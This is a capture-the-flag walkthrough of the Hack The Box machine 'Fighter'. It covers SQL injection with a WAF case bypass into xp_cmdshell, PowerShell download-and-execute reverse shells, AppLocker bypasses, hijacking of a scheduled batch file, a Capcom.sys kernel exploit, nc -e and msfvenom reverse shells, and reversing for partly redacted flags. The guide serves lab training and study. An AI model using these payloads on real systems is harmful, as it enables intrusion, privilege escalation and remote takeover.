# HTB Fighter - Complete Step-by-Step Walkthrough

> **Target:** 10.129.228.121  
> **OS:** Windows Server 2012 R2  
> **Difficulty:** Insane  
> **Flags:**
> - User: `bb6163[redacted]35934297`
> - Root: `d801c[redacted]3be314c1`

---

## Table of Contents
1. [The Hacker Mindset: Approach](#the-hacker-mindset-approach)
2. [Step 1: Network Reconnaissance](#step-1-network-reconnaissance)
3. [Step 2: Web Enumeration & Subdomain Discovery](#step-2-web-enumeration--subdomain-discovery)
4. [Step 3: Finding the Login Page](#step-3-finding-the-login-page)
5. [Step 4: Discovering SQL Injection](#step-4-discovering-sql-injection)
6. [Step 5: Exploiting SQL Injection with Stacked Queries](#step-5-exploiting-sql-injection-with-stacked-queries)
7. [Step 6: WAF Bypass & xp_cmdshell](#step-6-waf-bypass--xpcmdshell)
8. [Step 7: Getting a Shell as sqlserv](#step-7-getting-a-shell-as-sqlserv)
9. [Step 8: Privilege Escalation to decoder](#step-8-privilege-escalation-to-decoder)
10. [Step 9: Getting the User Flag](#step-9-getting-the-user-flag)
11. [Step 10: Privilege Escalation to SYSTEM](#step-10-privilege-escalation-to-system)
12. [Step 11: Getting the Root Flag](#step-11-getting-the-root-flag)
13. [Alternative Paths](#alternative-paths)
14. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## The Hacker Mindset: Approach

Before we type a single command, let's talk about **how to think** when approaching a box like Fighter.

### Reconnaissance is 90% of the Game
You cannot exploit what you don't know exists. Every open port, every DNS name, every hidden directory is a potential entry point. The goal of recon isn't to "hack" anything yet—it's to build a **map of the target's attack surface**.

### Follow the Clues
When a website says "our old members site is still available... you know the link," that's not flavor text. That's the box creator **telling you** there's something to find. In real-world penetration testing, developers and users leak information constantly. Learn to recognize hints.

### Assume Nothing, Verify Everything
Just because a login form looks secure doesn't mean it is. Just because `xp_cmdshell` returns an error doesn't mean it's disabled. Just because PowerShell is "blocked" doesn't mean you can't find another way to run it. Hackers are persistent because they test assumptions.

### Understand the Environment
Windows boxes have unique characteristics: AppLocker, Windows Firewall, User Account Control, service accounts with specific privileges, scheduled tasks, and vulnerable drivers. Understanding the **Windows ecosystem** is crucial for privilege escalation.

---

## Step 1: Network Reconnaissance

### What We Do
We start by discovering what services are running on the target. We use `nmap` to scan all 65,535 TCP ports.

### Why We Do It
Every open port is a potential entry point. A web server might have a vulnerable application. A database might have weak credentials. An SMB share might expose sensitive files. We scan **all ports** because services sometimes run on non-standard ports to "hide" from casual scans.

### The Commands

```bash
# Full port scan (SYN stealth scan, fast)
sudo nmap -Pn -sS -p- --min-rate=5000 10.129.228.121

# Service version detection on discovered port
sudo nmap -Pn -sC -sV -p80 10.129.228.121
```

### The Results

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### The Hacker Mindset
**Only one port open.** On Hack The Box, this is common. It means our entry point is almost certainly the web server. IIS 8.5 tells us this is likely **Windows Server 2012 R2**. This OS knowledge becomes critical later when we exploit the Capcom driver—we need to know what exploits are compatible.

The `TRACE` method being available is a minor information disclosure (XST attack potential), but not our main path.

---

## Step 2: Web Enumeration & Subdomain Discovery

### What We Do
We visit the website and read every word on it. We also add the domain to `/etc/hosts` and look for subdomains.

### Why We Do It
Modern web applications often use **virtual hosts** (vhosts) to serve different content on the same IP address. The main site might be a decoy, while a subdomain hosts the actual application. The hint on the homepage about "members" and "knowing the link" is a dead giveaway.

### The Commands

```bash
# Add domain to /etc/hosts so our browser resolves it
echo "10.129.228.121 streetfighterclub.htb members.streetfighterclub.htb" | sudo tee -a /etc/hosts

# Fuzz for subdomains using wfuzz
wfuzz -u http://streetfighterclub.htb -H "Host: FUZZ.streetfighterclub.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --hh 6911
```

### The Results

The main site is a fan page for Street Fighter. The top post says:

> "We're currently redesigning our website streetfighterclub.htb for a new modern look and functionality. The new site should be up and running soon. Meanwhile our \"old\" members site is still available for our registered members (p.s you know the link...)"

`wfuzz` discovers:
```
000000134:   403        29 L     92 W     1233 Ch     "members"
```

### The Hacker Mindset
**The hint is the attack vector.** The phrase "you know the link" is classic CTF/box design—it tells you that the path isn't obvious and needs to be discovered. The `403 Forbidden` on `members.streetfighterclub.htb` means the subdomain exists but we can't access the root. We need to **brute-force directories** on this subdomain.

A `403` is actually **good news**—it confirms the vhost is configured and serving something. A non-existent subdomain would return the same content as the main site (or a different error).

---

## Step 3: Finding the Login Page

### What We Do
We run a directory brute-force scan on the members subdomain to find hidden pages.

### Why We Do It
Web servers have default behaviors. IIS servers often host `.asp` and `.aspx` files. The `403` on the root of `members` suggests there's content behind it, but we need to guess the path.

### The Command

```bash
feroxbuster -u http://members.streetfighterclub.htb \
  -x aspx,asp,html \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt \
  --no-recursion
```

### The Results

```
301      GET        2l       10w      164c http://members.streetfighterclub.htb/old => http://members.streetfighterclub.htb/old/
200      GET       58l      129w     1821c http://members.streetfighterclub.htb/old/login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/welcome.asp => Login.asp
302      GET        2l       10w      130c http://members.streetfighterclub.htb/old/verify.asp => login.asp
```

### The Hacker Mindset
**Patterns reveal architecture.** We see:
- `login.asp` — the entry point
- `verify.asp` — likely handles the POST request
- `welcome.asp` — likely the post-login page

The `302` redirects tell us the flow: `login.asp` → POST to `verify.asp` → redirect to `welcome.asp` (or back to `login.asp` on failure).

We now know we're dealing with **Classic ASP** (not ASP.NET), which historically has had many SQL injection vulnerabilities because developers often concatenated user input directly into SQL queries.

---

## Step 4: Discovering SQL Injection

### What We Do
We analyze the login form's HTTP request and test each parameter for SQL injection.

### Why We Do It
Login forms are prime targets for SQL injection because they almost always query a database to validate credentials. If the query is constructed unsafely, we can manipulate it.

### The Analysis

Using `curl` or Burp Suite, we capture the POST request:

```http
POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin&logintype=2&rememberme=ON&B1=LogIn
```

We notice:
- `username` and `password` are base64-encoded in the response cookies
- `logintype=2` (user login), `logintype=1` (administrator login)

### Testing for SQL Injection

We test each parameter. The `username` and `password` fields reflect our input in cookies but don't seem to cause errors with weird input. However, `logintype` is different.

**Test 1: Normal login**
```bash
curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&password=admin&logintype=2&rememberme=ON&B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 302
```

**Test 2: SQL comment syntax**
```bash
curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&password=admin&logintype=1--+-x&rememberme=ON&B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 302
```

**Test 3: Invalid input (no SQL)**
```bash
curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  -d "username=admin&password=admin&logintype=abc&rememberme=ON&B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
# Returns: 500 (Internal Server Error)
```

### The Hacker Mindset
**Error messages are information.** The `500` error when `logintype=abc` tells us the application expects a number and crashes when it gets text. But when we send `1--+-x` (a number followed by a SQL comment), it returns `302`—the same as a successful login.

This means the SQL query looks something like:
```sql
SELECT * FROM users WHERE username='admin' AND password='admin' AND logintype=2
```

When we send `1--+-x`, it becomes:
```sql
SELECT * FROM users WHERE username='admin' AND password='admin' AND logintype=1--+-x
```

The `--` comments out the rest of the query, and the `1` makes the `WHERE` clause true (assuming the user exists). The `302` redirect means the query returned rows—**we have SQL injection**.

**Why `logintype` and not `username`?** Because `username` and `password` are likely wrapped in quotes in the SQL query, so our input is treated as a string. But `logintype` is used as a raw number, so we can inject SQL operators directly.

---

## Step 5: Exploiting SQL Injection with Stacked Queries

### What We Do
We confirm we can execute arbitrary SQL commands using **stacked queries** (multiple queries separated by `;`).

### Why We Do It
Classic ASP with MSSQL is notorious for allowing stacked queries by default. This means if we can inject `;`, we can run entirely new SQL commands—including system commands via `xp_cmdshell`.

### Understanding Stacked Queries

In MySQL, stacked queries are often disabled. But in **Microsoft SQL Server with ASP/ADO**, they're frequently enabled. This is a critical distinction. A stacked query attack looks like:

```sql
SELECT * FROM users WHERE logintype=3; EXEC xp_cmdshell 'whoami'; -- -
```

The database executes:
1. The original `SELECT`
2. Our injected `EXEC xp_cmdshell 'whoami'`

### Confirming Stacked Queries Work

We can't easily see the output (blind injection), so we use a **time-based or network-based** confirmation. The classic approach is `ping`—if we see ICMP packets, our command executed.

**Start tcpdump to watch for pings:**
```bash
sudo tcpdump -ni tun0 icmp
```

**Send the stacked query:**
```bash
curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=admin" \
  --data-urlencode "logintype=3;EXEC xp_cmDshElL 'ping 10.10.16.84'-- -" \
  -d "rememberme=ON&B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
```

**Result:** `302` HTTP code, and `tcpdump` shows ICMP echo requests from `10.129.228.121`.

### The Hacker Mindset
**Blind injection doesn't mean helpless.** Even though we don't see command output in the HTTP response, we can confirm execution through side effects:
- **Network effects:** DNS lookups, pings, HTTP requests to our server
- **Time delays:** `WAITFOR DELAY '0:0:5'` makes the response take 5 seconds
- **File system:** Write files we can read later

The `ping` is our "canary"—it proves we have arbitrary command execution.

---

## Step 6: WAF Bypass & xp_cmdshell

### What We Do
We discover that a Web Application Firewall (WAF) or filtering mechanism blocks `xp_cmdshell` in normal case, but **mixed case** bypasses it.

### Why This Happens
Many security filters use simple string matching. If the filter looks for `xp_cmdshell` (lowercase), changing the case to `xp_cmDshElL` bypasses the filter while MSSQL still recognizes it (SQL Server is case-insensitive for commands).

### The Evidence

| Payload | Result |
|---------|--------|
| `3;EXEC xp_cmdshell 'ping ...'` | `500` Error |
| `3;EXEC xp_cmdshell "ping ..."` | `302` instantly, no ping |
| `3;EXEC xp_cmDshElL "ping ..."` | `302` after 5 seconds, ping received! |

### The Hacker Mindset
**Filters are dumb; databases are smart.** WAFs often block known attack signatures, but the underlying database doesn't care about case. This is why **encoding, case manipulation, and comment insertion** are classic bypass techniques.

Always test variations:
- Uppercase/lowercase/mixed case
- URL encoding (`%20` instead of space)
- Double encoding
- Unicode normalization
- Comment insertion (`xp_/*foo*/cmdshell`)

---

## Step 7: Getting a Shell as sqlserv

### What We Do
We use `xp_cmdshell` to execute a PowerShell reverse shell.

### Why We Use PowerShell
PowerShell is deeply integrated into Windows and can easily create network connections, download files, and execute complex scripts. It's the ideal payload delivery mechanism on Windows targets.

### The First Obstacle: AppLocker

We try to run PowerShell:
```powershell
powershell.exe -c "ping 10.10.16.84"
```
Nothing happens.

We try the full path:
```powershell
C:\Windows\system32\windowspowershell\v1.0\powershell.exe -c "ping 10.10.16.84"
```
Still nothing.

But the 32-bit version:
```powershell
C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe -c "ping 10.10.16.84"
```
**It works!**

### Understanding AppLocker

AppLocker is a Windows application control feature. Administrators can create rules like:
- "Only allow executables in `C:\Windows\System32` to run"
- "Block PowerShell.exe"

However, administrators often forget about:
- **32-bit versions** of programs in `SysWow64`
- **Trusted directories** like `C:\Windows\System32\spool\drivers\color`
- **Built-in binaries** like `msbuild.exe` that can execute code

This is a **classic sysadmin mistake**: blocking the obvious path but leaving alternate paths wide open.

### The Second Obstacle: Windows Firewall

We check the firewall rules:
```powershell
Get-NetFirewallProfile
Get-NetFirewallRule -Direction Outbound -Enabled True
```

**All profiles block outbound by default.** Only ports **80** and **443** are allowed out.

This means our reverse shell **must** connect back on port 443 (or 80). Using any other port will fail silently.

### The Reverse Shell Setup

**On Kali:**
```bash
# Terminal 1: HTTP server to serve payload
cd /tmp && sudo python3 -m http.server 80

# Terminal 2: Reverse shell listener
rlwrap -cAr nc -lvnp 443
```

**Download the Nishang PowerShell reverse shell:**
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -O REV.PS1
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.84 -Port 443' >> REV.PS1
```

> **Why `REV.PS1` in uppercase?** MSSQL's `xp_cmdshell` upper-cases the command string before execution. When PowerShell requests `rev.ps1`, it actually requests `REV.PS1`. Python's HTTP server is case-sensitive on Linux, so we name the file `REV.PS1` to match.

**Trigger the shell via SQL injection:**
```bash
curl -s -X POST "http://members.streetfighterclub.htb/old/verify.asp" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=admin" \
  --data-urlencode "logintype=3;EXEC xp_cmDshElL 'C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe \"iex(new-object net.webclient).downloadstring(\\\"http://10.10.16.84/REV.PS1\\\")\"'-- -" \
  -d "rememberme=ON&B1=LogIn" \
  -o /dev/null -w "%{http_code}\n"
```

**Result:** We catch a shell:
```
Windows PowerShell running as user sqlserv on FIGHTER
PS C:\Windows\system32> whoami
fighter\sqlserv
```

### The Hacker Mindset
**Know the environment.** If we hadn't checked the firewall, we might have wasted hours trying reverse shells on random ports. If we hadn't tested both 64-bit and 32-bit PowerShell, we might have concluded code execution was impossible.

When something "should work but doesn't," ask:
- Is there a firewall?
- Is there application whitelisting (AppLocker)?
- Are there multiple versions of the program?
- Is the command being modified (case changes, encoding)?

---

## Step 8: Privilege Escalation to decoder

### What We Do
We enumerate the system as `sqlserv` and find a way to escalate to the `decoder` user.

### System Enumeration

**Users on the box:**
```powershell
net user
# Output: Administrator, decoder, Guest, sqlserv
```

**Interesting file:**
```powershell
# C:\users\decoder\clean.bat
@echo off
del /q /s c:\users\decoder\appdata\local\TEMP\*.tmp
exit
```

This looks like a **scheduled task**—a script that runs periodically to clean up temp files.

**Permissions on clean.bat:**
```powershell
icacls clean.bat
# Output: clean.bat Everyone:(M)
```

`Everyone:(M)` means **any user can modify this file**.

### The Plan

If we can modify `clean.bat` to run our code instead of (or in addition to) cleaning temp files, the scheduled task will execute it as `decoder`.

### The Obstacles

1. **AppLocker blocks writing `.bat` files:**
   ```powershell
   echo "test" > clean.bat
   # Access denied
   ```

2. **The file has an `exit` command:** Even if we append to the file, nothing after `exit` will run.

### The Solution: Truncate and Append

**Truncate the file using `copy /y NUL`:**
```powershell
cmd /c "copy /y NUL clean.bat"
```

Surprisingly, this works! `copy NUL file` creates an empty file using the **append** permission, which `Everyone:(M)` grants us.

**Plant our payload:**
```powershell
cmd /c "echo powershell iex(new-object net.webclient).downloadstring('http://10.10.16.84/REV.PS1') >> clean.bat"
```

Now `clean.bat` contains only our reverse shell command.

### Waiting for the Scheduled Task

Scheduled tasks that run every minute are common for cleanup scripts. We wait up to 60 seconds for the task to trigger.

**Result:** A new connection on our `nc` listener:
```
Windows PowerShell running as user decoder on FIGHTER
PS C:\Windows\system32> whoami
fighter\decoder
```

### The Hacker Mindset
**File permissions are low-hanging fruit.** In Windows, `icacls` is your best friend. Always check:
- Who owns files in user directories?
- What permissions do service accounts have on scripts?
- Are there `.bat`, `.ps1`, `.vbs` files that run automatically?

The `copy /y NUL` trick is a classic **AppLocker bypass** for file truncation. When you can't overwrite a file directly (blocked by extension), truncating via `copy` uses different Windows APIs that may not be restricted.

---

## Step 9: Getting the User Flag

### The Command
```powershell
type C:\Users\decoder\desktop\user.txt
```

### The Flag
```
bb6163[redacted]5934297
```

### The Hacker Mindset
**Always check what you've compromised.** After escalating to a new user, immediately check their desktop, documents, and browser history. The user flag is often just sitting there, but sometimes you'll find credentials, SSH keys, or other useful files.

---

## Step 10: Privilege Escalation to SYSTEM

### What We Do
We discover a vulnerable kernel driver (`capcom.sys`) and exploit it to gain `SYSTEM` privileges.

### Discovery

**Check loaded drivers:**
```powershell
driverquery /v | findstr /iv "system32\\drivers"
```

**Result:**
```
Capcom       Capcom                 Capcom                 Kernel        Auto       Running    OK         TRUE        FALSE        0                 1.280       0          05/09/2016 08:43:33    \??\C:\Windows\drivers\Capcom.sys                384
```

**Why is this suspicious?**
- `Capcom` is a video game company (makes Street Fighter!)
- The driver is in `C:\Windows\` instead of `C:\Windows\System32\drivers`
- It's a **third-party kernel driver** on a server—unusual

### Background: The Capcom.sys Vulnerability

The `capcom.sys` driver was distributed with Street Fighter 5. It contains a deliberate "feature" that allows user-mode applications to execute arbitrary code in kernel mode. This was intended for anti-cheat purposes but creates a massive security hole.

The vulnerability:
1. The driver exposes an IOCTL that disables SMEP (Supervisor Mode Execution Prevention)
2. It then executes a user-provided function pointer
3. Attackers can pass a pointer to their shellcode
4. The shellcode runs in kernel mode with `SYSTEM` privileges

### The Exploit

We use the **Capcom-Rootkit** PowerShell exploit by FuzzySecurity:

**On Kali:**
```bash
cd /tmp
git clone https://github.com/FuzzySecurity/Capcom-Rootkit.git
cd Capcom-Rootkit
find . -name "*.ps1" -exec cat {} \; -exec echo \; > /tmp/capcom-all
```

**On Target (as decoder):**
```powershell
# Load all the PowerShell functions into our session
iex(new-object net.webclient).downloadstring('http://10.10.16.84/capcom-all')

# Execute the exploit
capcom-elevatepid
```

**Output:**
```
[+] SYSTEM Token: 0xFFFFC00119E077CA
[+] Found PID: 2044
[+] PID token: 0xFFFFC0011B9A8067
[!] Duplicating SYSTEM token!
```

**Verify:**
```powershell
whoami
# nt authority\system
```

### The Hacker Mindset
**Kernel drivers are the keys to the kingdom.** Any third-party kernel driver is a potential privilege escalation vector. Here's how to find them:

1. `driverquery /v` — list all drivers
2. Look for non-Microsoft drivers
3. Look for drivers in unusual paths
4. Google the driver name + "exploit" or "vulnerability"

The Capcom driver is **famous** in the security community. When you see it, you know it's exploitable. Building a mental database of known-vulnerable drivers (Capcom, DBUtil, RTCore64, etc.) is essential for Windows privilege escalation.

**Why PowerShell?** Because AppLocker blocks `.exe` files, but we're running PowerShell code directly in memory. No file is written to disk, so AppLocker never sees it.

---

## Step 11: Getting the Root Flag

### What We Find

```powershell
cd C:\users\administrator\desktop
ls
```

Output:
```
checkdll.dll
root.exe
```

No `root.txt`! The flag is hidden behind a reverse-engineering challenge.

### Analyzing root.exe

```powershell
.\root.exe
# Output: C:\users\administrator\desktop\root.exe <password>

.\root.exe wrongpassword
# Output: Sorry, check returned: 0
```

The executable:
1. Takes a password argument
2. Calls `check(password)` from `checkdll.dll`
3. If `check` returns `1`, prints the flag
4. If `check` returns `0`, prints an error

### Reverse Engineering checkdll.dll

We can copy the files to our web root and download them to Kali for analysis:

```powershell
copy checkdll.dll C:\inetpub\wwwroot\street\checkdll.dll
copy root.exe C:\inetpub\wwwroot\street\root.exe
```

**On Kali:**
```bash
wget http://members.streetfighterclub.htb/street/checkdll.dll
wget http://members.streetfighterclub.htb/street/root.exe
```

**Analyzing with Python instead of Ghidra:**

The `check` function in `checkdll.dll`:
1. Takes a 10-character password
2. XORs each byte with `9`
3. Compares against an obfuscated buffer

```python
obpass = b'\x46\x6d\x60\x66\x45\x68\x4f\x6c\x7d\x68'
password = ''.join([chr(x ^ 9) for x in obpass])
print(password)  # OdioLaFeta
```

The `print_flag` function in `root.exe`:
1. Loops over a 32-byte buffer
2. Subtracts `7` from each byte
3. Prints the result

```python
obflag = b'\x4b\x3f\x37\x38\x4a\x38\x4c\x40\x49\x4b\x40\x48\x37\x39\x4d\x3f\x4d\x49\x3a\x37\x4b\x3f\x49\x4b\x3a\x49\x4c\x3a\x38\x3b\x4a\x38'
flag = ''.join([chr(x - 7) for x in obflag]).lower()
print(flag)  # d801c1[redacted]3be314c1
```

### Getting the Flag

```powershell
.\root.exe OdioLaFeta
```

**Output:**
```
d801c[redacted]d3be314c1
```

### The Hacker Mindset
**Reverse engineering is just following the data.** You don't need to be a binary ninja to solve simple RE challenges:

1. Look for strings (especially error messages)
2. Find where those strings are referenced
3. Trace backward to understand the logic
4. Reconstruct the algorithm in Python

In real penetration testing, you might encounter custom authentication binaries, encrypted configuration files, or malware. Understanding basic reverse engineering concepts (XOR, addition/subtraction obfuscation, string analysis) is incredibly valuable.

---

## Alternative Paths

### JuicyPotato (Token Impersonation)

From `sqlserv` (or `decoder`), we have `SeImpersonatePrivilege`:
```powershell
whoami /priv
# SeImpersonatePrivilege ... Enabled
```

JuicyPotato exploits DCOM/RPC to impersonate `NT AUTHORITY\SYSTEM`. Since BITS is disabled on this box, we use a different CLSID:

```powershell
# Upload JuicyPotato.exe and nc64.exe to the whitelisted color directory
wget http://10.10.16.84/JuicyPotato.exe -outfile C:\windows\system32\spool\drivers\color\jp.exe
wget http://10.10.16.84/nc64.exe -outfile C:\windows\system32\spool\drivers\color\nc64.exe

# Create a batch file for the reverse shell
cmd /c "echo C:\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.16.84 443 > rev.bat"

# Execute JuicyPotato with the Windows Management CLSID
C:\windows\system32\spool\drivers\color\jp.exe -t * -p "C:\windows\system32\spool\drivers\color\rev.bat" -l 9001 -c "{8BC3F05E-D86B-11D0-A075-00C04FB68820}"
```

### MSBuild AppLocker Bypass

`msbuild.exe` is a trusted Windows binary that executes C# code from XML files. We can embed shellcode in an XML project file:

```powershell
# Generate C# shellcode with msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.84 LPORT=443 -f csharp -v shellcode

# Embed in MSBuild XML template, upload as sc.xml
C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sc.xml
```

### Extensionless Executables

AppLocker blocks `.exe` but not extensionless files:
```powershell
# Upload as "met" (no extension)
wget 10.10.16.84/met.exe -outfile met

# Execute directly
Start-Process -Filepath C:\programdata\met -Wait -NoNewWindow
```

### Whitelisted Directory

`C:\Windows\System32\spool\drivers\color` is world-writable and AppLocker-whitelisted:
```powershell
copy met C:\windows\system32\spool\drivers\color\met.exe
# Works! Execute from there.
```

---

## Key Lessons & Takeaways

### 1. Read Everything
The hint about the "members site" was on the homepage. In real engagements, developers leak information in comments, error messages, and "helpful" text.

### 2. Test Assumptions
`xp_cmdshell` was "blocked" by a WAF, not disabled. PowerShell was "blocked" for 64-bit, but 32-bit worked. What seems impossible often just needs a different angle.

### 3. Understand Windows Defenses
- **AppLocker:** Blocks by path, publisher, or hash. Often has gaps (32-bit apps, whitelisted directories, built-in binaries like `msbuild`).
- **Windows Firewall:** Can block outbound traffic. Always verify allowed ports before launching reverse shells.
- **UAC/Token Privileges:** `SeImpersonatePrivilege` opens doors to JuicyPotato and similar exploits.

### 4. Kernel Drivers = SYSTEM
Any non-Microsoft kernel driver is worth investigating. Known-vulnerable drivers (Capcom, DBUtil, etc.) are reliable privilege escalation vectors.

### 5. Blind Injection Techniques
When you can't see output:
- Use `ping` + `tcpdump` for network confirmation
- Use `nslookup` + `tcpdump` for DNS exfiltration
- Use `WAITFOR DELAY` for time-based confirmation
- Write output to files you can read via other means

### 6. Scheduled Tasks Are Gold
Any script that runs automatically and is writable by low-privilege users is a privilege escalation vector. Always check:
```powershell
Get-ScheduledTask | Get-ScheduledTaskInfo
schtasks /query /fo LIST /v
```

### 7. Reverse Engineering Basics
You don't need Ghidra for simple challenges. Look for:
- Error strings to find relevant functions
- XOR loops (common in CTFs)
- Addition/subtraction obfuscation
- Hardcoded buffers

---

## Final Flags

```
User: bb6163[redacted]35934297
Root: d801c1[redacted]bd3be314c1
```

**Fighter: Complete.** 
